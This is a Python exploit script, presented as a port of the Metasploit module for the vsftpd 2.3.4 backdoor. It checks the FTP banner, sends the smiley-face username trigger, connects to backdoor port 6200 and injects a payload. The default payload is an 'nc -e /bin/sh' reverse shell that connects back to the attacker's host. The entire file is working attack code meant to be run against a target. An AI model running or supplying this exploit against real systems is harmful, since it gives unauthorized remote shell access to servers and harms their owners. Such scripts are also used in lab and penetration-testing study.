# Description: A Python version of the Metasploit exploit for vsftpd version 2.3.4
# # How the exploit script works?
# 1. Create a TCP connection socket.
# 2. Connect to FTP on port 21.
# 3. Check if the running FTP is the targeted vulnerable version vsftpd 2.3.4.
# 4. Start exploiting by providing an arbitary username with appending smiley face 'abc123:)' and blank password
# 5. Create a backdoor TCP connection socket that connects on the backdoor port 6200 (https://en.wikipedia.org/wiki/Vsftpd).
# 6. Injecr the payload and send it to the target.
# 7. Use nc to listen on the defined revshell-port to get the reverse shell.

import argparse
import socket
import sys
import re

# General metthod to create a TCP socket connection
def init_tcp_conn(target, port):
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((target, port))
    return conn

# Initialize connection to FTP service on target server
def init_ftp_conn(target, port):
    return init_tcp_conn(target, 21)

# Check the FTP service to make sure it is vulnerable to this exploit.
def check_service_version(conn):
    print('Checking service version.')
    banner_data = conn.recv(1024)
    banner = banner_data.decode().strip()
    print('Banner: {}'.format(banner))
    # Check to make sure this is indeed running vsftpd v2.3.4
    if banner.lower() != '220 (vsftpd 2.3.4)':
        return False
    return True

# Send the parameters to the FTP server that will open the backdoor port.
def open_backdoor(conn):
    print('Opening backdoor.')
    send_bytes = conn.send('USER abc123:)\r\n'.encode())
    response = conn.recv(1024)
    passwd_response = response.decode().strip()
    passwd_response_code = int(passwd_response.split()[0])
    if passwd_response_code != 331:
        return False
    send_bytes = conn.send('PASS \r\n'.encode())
    return True

# Create a backdoor connection to the specified target.
def init_backdoor_conn(target):
    return init_tcp_conn(target, 6200)

def inject_payload(conn, payload):
    send_bytes = conn.send('id\n'.encode())
    response = conn.recv(1024)
    uid_data = response.decode().strip()
    if re.search(r'^uid=', uid_data):
        uid = uid_data.split('(')[1].split(')')[0]
        print('Got shell as user {}!'.format(uid))
        # send a simple reverse shell from the exploited server to the attacking host
        send_bytes = conn.send('nohup {} >/dev/null 2>&1\n'.format(payload).encode())
        return True
    else:
        print(uid_data)
        return False

def main():
    parser = argparse.ArgumentParser(description='A Python version of the Metasploit exploit for vsftpd version 2.3.4')
    parser.add_argument('-i', '--inject', help='Custom payload to inject upon successful exploit')
    parser.add_argument('-r', '--revshell-ip', help='Target IP for reverse shell to connect back to upon successful exploit')
    parser.add_argument('-p', '--revshell-port', default=4444, help='Target port for reverse shell to connect back to upon successful exploit (default is 4444)')
    parser.add_argument('target_host', help='Target for exploit')
    args = parser.parse_args()

    # Initialize variables
    target = args.target_host
    revshell_ip = args.revshell_ip
    revshell_port = int(args.revshell_port)
    payload = args.inject

    if not payload and not revshell_ip:
        print('ERROR: Must define either a reverse shell target IP or a custom payload.')
        sys.exit(1)
    if not payload:
        payload = 'nc -e /bin/sh {} {}'.format(revshell_ip, revshell_port)

    # Initialize connection to FTP service on target server
    conn = init_ftp_conn(target, 21)

    if not check_service_version(conn):
        print('ERROR: This is not a vsftpd server on version 2.3.4, so this exploit will not work. Exiting.')
        sys.exit(100)

    # Now that we've verified this server is vulnerable, open the backdoor
    if not open_backdoor(conn):
        print('ERROR: The server did not respond as expected. Exiting.')
        sys.exit(101)


    # The backdoor should now be open, so we connect to it with a new socket connection
    backdoor_conn = init_backdoor_conn(target)

    # Try to inject the payload
    if inject_payload(backdoor_conn, payload):
        print('Exploit successful!')
    else:
        print('ERROR: Did not gain shell. Exploit failed.')

    # Clean up
    print('Closing connections to server.')
    backdoor_conn.close()
    conn.close()
    print('Exploit complete.')

if __name__ == '__main__':
    main()
